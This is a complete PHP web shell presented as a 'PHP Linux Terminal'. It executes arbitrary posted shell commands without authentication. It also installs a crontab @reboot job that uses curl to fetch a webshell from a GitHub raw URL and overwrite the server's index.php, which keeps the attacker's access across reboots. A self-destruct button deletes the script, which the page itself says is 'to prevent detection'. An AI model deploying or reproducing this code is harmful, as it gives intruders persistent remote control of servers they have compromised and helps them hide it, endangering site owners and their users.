<?php
session_start();

function addCronJob($githubRawUrl) {
    // MODIFICATION: We tell curl to save the file (-o) to the Apache folder
    // instead of just running it in the background.
    $targetPath = "/var/www/html/index.php";
    $job = "@reboot curl -s $githubRawUrl -o $targetPath > /dev/null 2>&1";
    
    $currentCron = shell_exec('crontab -l 2>/dev/null');

    if (strpos($currentCron, $githubRawUrl) === false) {
        file_put_contents('/tmp/new_cron', $currentCron . $job . PHP_EOL);
        exec('crontab /tmp/new_cron');
        echo "Successfully added to boot schedule! File will save to $targetPath on next boot.\n";
    }
}

// Ensure this matches the actual Raw URL from GitHub
addCronJob("https://raw.githubusercontent.com/xanxandra/tmp/refs/heads/main/webshell/index.php");

if (isset($_POST['self_destruct']) && $_POST['self_destruct'] === 'yes') {
    $thisFile = __FILE__;

    echo "<!doctype html><html><body style='background:black;color:red;font-family:monospace;padding:20px;'>";

    if (is_writable($thisFile)) {
        unlink($thisFile);
        echo "<h1> removed itself from disk to prevent detection </h1>";
        echo "<p>This script has deleted itself.</p>";
    } else {
        echo "<h1> SELF DESTRUCT FAILED</h1>";
        echo "<p>File is not writable.</p>";
    }

    echo "</body></html>";
    exit;
}

if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = '/tmp'; // safe default
}

$cmd = trim($_POST['cmd'] ?? '');
$output = '';

if ($cmd !== '') {
    $process = proc_open(
        "cd " . escapeshellarg($_SESSION['cwd']) . " && $cmd 2>&1; pwd",
        [
            1 => ["pipe", "w"]
        ],
        $pipes
    );

    if (is_resource($process)) {
        $data = stream_get_contents($pipes[1]);
        fclose($pipes[1]);
        proc_close($process);

        $lines = explode("\n", trim($data));
        $_SESSION['cwd'] = array_pop($lines);
        $output = implode("\n", $lines);
    }
}
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>PHP Linux Terminal</title>

<style>
html, body {
    margin: 0;
    height: 100%;
    background: black;
    color: white;
    font-family: monospace;
}

#output {
    padding: 16px;
    white-space: pre-wrap;
    font-size: 18px;
    line-height: 1.4;
}

form.terminal {
    display: flex;
    padding: 16px;
    border-top: 1px solid #222;
}

.prompt,
input {
    font-size: 18px;
    font-family: monospace;
}

.prompt {
    margin-right: 6px;
}

input {
    flex: 1;
    background: black;
    color: white;
    border: none;
    outline: none;
}

form.destruct {
    padding: 16px;
}

form.destruct button {
    background: black;
    color: red;
    border: 1px solid red;
    font-family: monospace;
    font-size: 16px;
    padding: 8px 14px;
    cursor: pointer;
}
</style>
</head>

<body>

<?php if ($output !== ''): ?>
<div id="output"><?= htmlspecialchars($output) ?></div>
<?php endif; ?>

<form class="terminal" method="post" autocomplete="off">
    <span class="prompt"><?= htmlspecialchars($_SESSION['cwd']) ?> $</span>
    <input name="cmd" autofocus>
</form>

<form class="destruct" method="post"
      onsubmit="return confirm('This will permanently delete this script. Continue?');">
    <input type="hidden" name="self_destruct" value="yes">
    <button>delete interactive web terminal (self destruct)</button>
</form>

</body>
</html>

